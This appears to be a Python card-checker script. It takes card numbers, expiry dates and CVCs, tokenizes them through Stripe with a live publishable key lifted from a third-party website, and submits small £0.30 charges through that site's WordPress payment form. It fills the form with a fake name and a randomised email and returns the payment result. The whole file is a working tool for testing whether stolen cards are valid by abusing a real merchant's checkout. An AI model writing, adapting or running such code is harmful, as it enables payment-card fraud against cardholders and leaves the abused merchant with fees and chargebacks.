import requests
import random
import logging

logger = logging.getLogger(__name__)

def Tele(ccx):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        
        if len(parts) < 4:
            return "Invalid format. Use: card|MM|YY|CVC"
            
        n = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvc = parts[3].strip()
        
        # Handle year format
        if "20" in yy:
            yy = yy.split("20")[1]
        
        random_amount1 = random.randint(1, 4)
        random_amount2 = random.randint(1, 99)

        # First request - get payment method
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        data = f'type=card&billing_details[name]=Waiyan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA=number&payment_user_agent=stripe.js%2F916d815941%3B+stripe-js-v3%2F916d815941%3B+card-element&key=pk_live_51KLmjKDzMnVheZDCWlMej0gCp9fNe6JwjZhXmdduDmbia5wEofDW56jQn0IgaQ7Vr7dCUAkFezBhr4IDt7X3SiB100P8lDyThd'
        
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods', 
            headers=headers, 
            data=data,
            timeout=30
        )
        
        if response.status_code != 200:
            return f"Payment method error: {response.status_code}"
            
        response_data = response.json()
        
        if 'id' not in response_data:
            return "No payment method ID received"
            
        pm = response_data['id']
        
        # Second request - process payment
        headers = {
            'authority': 'www.perhamvillage.co.uk',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.perhamvillage.co.uk',
            'referer': 'https://www.perhamvillage.co.uk/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wp_full_stripe_inline_payment_charge',
            'wpfs-form-name': 'PayServiceCharge',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount-unique': '0.30',
            'wpfs-custom-input[]': ['Waiyan', 'Waiyan'],
            'wpfs-card-holder-email': f'Waiyan{random_amount1}{random_amount2}@gmail.com',
            'wpfs-card-holder-name': 'Waiyan',
            'wpfs-stripe-payment-method-id': f'{pm}',
        }
        
        response = requests.post(
            'https://www.perhamvillage.co.uk/wp-admin/admin-ajax.php', 
            headers=headers, 
            data=data,
            timeout=30
        )
        
        if response.status_code != 200:
            return f"Payment processing error: {response.status_code}"
            
        result_data = response.json()
        
        if 'message' in result_data:
            return result_data['message']
        else:
            return "Unknown response"
            
    except requests.exceptions.Timeout:
        return "Request timeout"
    except requests.exceptions.ConnectionError:
        return "Connection error"
    except Exception as e:
        logger.error(f"Tele function error: {e}")
        return f"Error: {str(e)}"
